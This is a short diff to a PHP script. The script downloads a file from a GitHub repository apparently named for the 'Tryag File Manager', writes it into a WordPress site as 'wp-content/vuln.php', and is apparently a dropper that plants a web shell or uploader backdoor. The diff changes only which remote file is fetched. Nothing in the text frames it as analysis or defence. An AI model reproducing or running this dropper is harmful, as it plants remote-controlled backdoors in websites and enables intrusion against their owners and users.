@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php" ;
-$text = http_get('https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/up.php');
+$text = http_get('https://raw.githubusercontent.com/Theanvenger/Tryag-File-Manager-jpeg/master/0up.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
